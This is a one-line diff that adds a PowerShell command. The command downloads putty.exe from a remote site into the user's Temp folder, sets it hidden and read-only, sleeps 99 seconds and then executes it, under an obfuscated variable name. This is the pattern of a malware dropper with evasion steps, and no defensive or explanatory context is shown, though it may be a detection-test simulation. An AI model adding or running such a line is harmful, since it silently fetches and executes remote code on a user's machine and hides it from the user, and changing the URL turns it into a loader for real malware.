@@ -1,0 +1,1 @@
+$adsjsdf454545dfjhSADJH=iwr 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe' -OutFile "C:\Users\$($env:USERNAME)\AppData\Local\Temp\putty.exe"; Set-ItemProperty -Path "C:\Users\$($env:USERNAME)\AppData\Local\Temp\putty.exe" -Name Attributes -Value "ReadOnly, Hidden"; Start-Sleep -Seconds 99; & "C:\Users\$($env:USERNAME)\AppData\Local\Temp\putty.exe"
